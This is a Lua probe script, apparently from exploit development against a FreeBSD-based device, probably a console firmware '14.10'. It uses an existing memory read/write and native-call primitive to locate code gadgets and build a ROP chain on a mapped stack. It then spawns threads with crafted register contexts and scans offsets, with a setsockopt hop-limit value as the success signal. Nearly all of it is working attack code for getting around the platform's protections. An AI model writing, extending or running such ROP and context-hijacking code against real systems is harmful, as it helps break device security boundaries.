-- CRASH_CLASS: LOW
-- PROBE 91o: Safe R10 offset test via setsockopt (read-only on R10)
--
-- setsockopt READS from [R10] (copyin), never writes to it.
-- Even if R10 is garbage, no memory corruption — just EFAULT.
--
-- Method:
-- 1. Main: create IPv6 socket, set UNICAST_HOPS=42
-- 2. Child: setsockopt(fd, 41, 4, optval, 4) with optval containing 77
--    R10 candidate = optval ptr, R8 candidate = 4
-- 3. Main: getsockopt UNICAST_HOPS → if 77, R10+R8 offsets confirmed
--
-- Test standard FreeBSD layout first (R10=0x090, R8=0x068)
-- Then scan all unknown offsets for R10 with fixed R8=0x068

print("=== PROBE 91o: SAFE R10 TEST (setsockopt) ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l; if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))

-- Known offsets
local _DI=0x048; local _SI=0x050; local _DX=0x058; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

-- Mmap region (4 pages)
local pg=0x4000
local ok_m,big=pcall(function()
    return mm(uint64(0),uint64(4*pg),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local base=N(big)

-- Timespec + short sleep
local ts_addr=base+0x3F00
wq(ts_addr,uint64(999)); wq(ts_addr+8,uint64(0))
local sl_addr=base+0x3F20
wq(sl_addr,uint64(0)); wq(sl_addr+8,uint64(50000000))

-- Create IPv6 socket from main thread
local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("IPv6 BLOCKED") return end

-- Set IPV6_UNICAST_HOPS=42 from main
local hop_buf=base+0x3E00
wd(hop_buf,42)
local hop_len=base+0x3E10
wd(hop_len,4)
native.fcall_with_rax(stub,105,s6,41,4,hop_buf,4)

-- Verify: getsockopt
local get_buf=base+0x3E20
local get_len=base+0x3E30
wd(get_buf,0); wd(get_len,4)
native.fcall_with_rax(stub,118,s6,41,4,get_buf,get_len)
local initial_hops=rd(get_buf)
print("initial hops="..tostring(initial_hops).." (expect 42)")

-- ============================================================
-- Test function: create child, try setsockopt with given offsets
-- ============================================================
local function test_r10(r10_off, r8_off, label)
    -- Reset hops to 42
    wd(hop_buf,42)
    native.fcall_with_rax(stub,105,s6,41,4,hop_buf,4)

    -- Prepare optval=77 in mmap
    local optval=base+0x200
    wd(optval,77)

    -- Stack + context + shared
    local stk=base+0x1000
    local ctx=base+0x1800
    local shared=base+0x100
    local tb=base+0x180

    -- Zero stack+context area
    for o=0,0x17FF,4 do wd(base+0x1000+o-0x1000+0x1000,0) end
    -- Actually zero the right range
    for o=0,0xFFF,4 do wd(stk+o,0) end

    wq(shared,uint64(0xBADBAD))
    wq(tb,uint64(0))

    -- ROP chain: after setsockopt, write rv to shared, nanosleep
    local sp=stk
    wq(sp,PRDI); sp=sp+8
    wq(sp,uint64(shared)); sp=sp+8
    wq(sp,WMOV); sp=sp+8
    wq(sp,PRDI); sp=sp+8
    wq(sp,uint64(ts_addr)); sp=sp+8
    wq(sp,PRAX); sp=sp+8
    wq(sp,uint64(240)); sp=sp+8
    wq(sp,SA); sp=sp+8

    -- Build context: setsockopt(s6, 41, 4, optval, 4)
    -- sys 105: RDI=fd, RSI=level, RDX=optname, R10=optval, R8=optlen
    for o=0,0x1FF,4 do wd(ctx+o,0) end
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA)
    wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(105))    -- setsockopt
    wq(ctx+_DI,uint64(s6))     -- fd
    wq(ctx+_SI,uint64(41))     -- IPPROTO_IPV6
    wq(ctx+_DX,uint64(4))      -- IPV6_UNICAST_HOPS

    -- Set R10 candidate = optval pointer
    wq(ctx+r10_off,uint64(optval))
    -- Set R8 candidate = 4 (optlen)
    if r8_off ~= r10_off then
        wq(ctx+r8_off,uint64(4))
    end

    -- Create child
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    -- Wait 50ms
    native.fcall_with_rax(stub,240,sl_addr,0)

    -- Read child's return value
    local rv=rq(shared)
    local rv_n=-999
    if rv then
        if type(rv)=="table" then
            local h=rv.h or 0; if h<0 then h=h+0x100000000 end
            if h==0xFFFFFFFF then rv_n=-1 else rv_n=N(rv) end
        else rv_n=N(rv) end
    end
    local crashed=(N(rv)==0xBADBAD)

    -- Check hops from main
    wd(get_buf,0); wd(get_len,4)
    native.fcall_with_rax(stub,118,s6,41,4,get_buf,get_len)
    local hops=rd(get_buf)

    local status=""
    if hops==77 then
        status=" *** HOPS CHANGED TO 77 — R10 CONFIRMED ***"
    elseif crashed then
        status=" [child crashed]"
    elseif rv_n==0 and hops~=42 then
        status=" [rv=0 but hops="..tostring(hops).."]"
    end

    print(string.format("  %s: rv=%d hops=%s%s",
        label, rv_n, tostring(hops or "nil"), status))

    -- Kill child
    if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end

    return hops==77
end

-- ============================================================
-- Phase 1: Test standard FreeBSD layout (R10=0x090, R8=0x068)
-- ============================================================
print("")
print("--- PHASE 1: Standard layout (R10=0x090, R8=0x068) ---")
local found=test_r10(0x090, 0x068, "std")

-- ============================================================
-- Phase 2: If standard didn't work, scan ALL R10 candidates
-- with R8 fixed at 0x068 (most likely R8 offset)
-- ============================================================
if not found then
    print("")
    print("--- PHASE 2: Scan R10 offsets (R8=0x068 fixed) ---")
    local candidates={0x060,0x068,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,off in ipairs(candidates) do
        local label=string.format("R10=0x%03X",off)
        found=test_r10(off, 0x068, label)
        if found then break end
    end
end

-- ============================================================
-- Phase 3: If still not found, try R8 at other offsets
-- with R10=0x090 fixed
-- ============================================================
if not found then
    print("")
    print("--- PHASE 3: Scan R8 offsets (R10=0x090 fixed) ---")
    local r8_cands={0x060,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,off in ipairs(r8_cands) do
        local label=string.format("R8=0x%03X",off)
        found=test_r10(0x090, off, label)
        if found then break end
    end
end

-- ============================================================
-- Phase 4: Full matrix scan (skip already tested)
-- ============================================================
if not found then
    print("")
    print("--- PHASE 4: R10xR8 matrix ---")
    local r10c={0x060,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    local r8c={0x060,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r10 in ipairs(r10c) do
        for _,r8 in ipairs(r8c) do
            if r10~=r8 then
                local label=string.format("R10=%03X,R8=%03X",r10,r8)
                found=test_r10(r10, r8, label)
                if found then break end
            end
        end
        if found then break end
    end
end

if not found then
    print("")
    print("*** R10 NOT RESTORABLE FROM CONTEXT ***")
    print("set_mcontext may not restore R10 on 14.10")
end

print("")
native.fcall_with_rax(stub,6,s6)
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91o DONE ===")
